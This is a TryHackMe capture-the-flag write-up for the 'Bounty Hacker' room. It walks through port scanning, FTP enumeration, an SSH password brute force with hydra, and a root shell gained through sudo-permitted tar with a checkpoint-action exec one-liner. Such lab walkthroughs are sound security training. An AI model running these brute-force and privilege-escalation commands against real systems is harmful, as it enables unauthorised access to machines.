# Bounty Hacker - TryHackMe Writeup

**Room Link:** https://tryhackme.com/room/bountyhacker

## Room Overview
This room involves exploiting a vulnerable web application through FTP enumeration, SSH brute forcing, and privilege escalation using a misconfigured sudo binary.

## Reconnaissance

### Nmap Scan
```bash
nmap -sV Target_ip
```

**Open Ports:**
- Port 21: FTP (vsftpd 3.0.5)
- Port 22: SSH (OpenSSH 8.2p1 Ubuntu)
- Port 80: HTTP (Apache httpd 2.4.41)

### FTP Enumeration
Connected to FTP server and discovered:
- `task.txt` - Contains task information
- `locks.txt` - Contains password wordlist

**task.txt contents:**
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

**locks.txt** - List of 26 potential passwords found

## Exploitation

### Username Discovery
From `task.txt`, identified the username: **lin** (signed by -lin)

### SSH Brute Force Attack
Used hydra to brute force SSH credentials:
```bash
hydra -l lin -P locks.txt -t 4 ssh://Target_ip
```

**Result:** 
- Username: `lin`
- Password: [Redacted for security]

### SSH Access
```bash
ssh lin@Target_ip
```

Successfully logged in as user `lin`

## User Flag

Located at: `/home/lin/Desktop/user.txt`

**Flag:** [Submit to TryHackMe]

## Privilege Escalation

### Sudo Privileges Check
```bash
sudo -l
```

**Result:** User `lin` can run `/bin/tar` with sudo privileges

### Tar Exploit
Used tar checkpoint exploit to spawn a root shell:
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

This command exploits tar's checkpoint feature to execute arbitrary commands as root.

## Root Flag

Located at: `/root/root.txt`

**Flag:** [Submit to TryHackMe]

## Key Findings

1. **Task Writer:** lin (from task.txt signature)
2. **Credentials Found:** Through FTP enumeration and SSH brute force
3. **Privilege Escalation:** Misconfigured sudo permissions on `/bin/tar` allowed privilege escalation via checkpoint-action exploit

## Key Learnings

- FTP enumeration can reveal valuable information (usernames, passwords lists)
- Brute forcing SSH with hydra using wordlists
- Identifying sudo privileges with `sudo -l`
- Tar privilege escalation via checkpoint-action exploit
- Importance of limiting sudo privileges to specific users

## Tools Used

- **nmap** - Port scanning and service enumeration
- **hydra** - SSH brute force attack
- **ssh** - Remote shell access
- **tar** - For privilege escalation exploit
- **sudo** - Privilege escalation vector
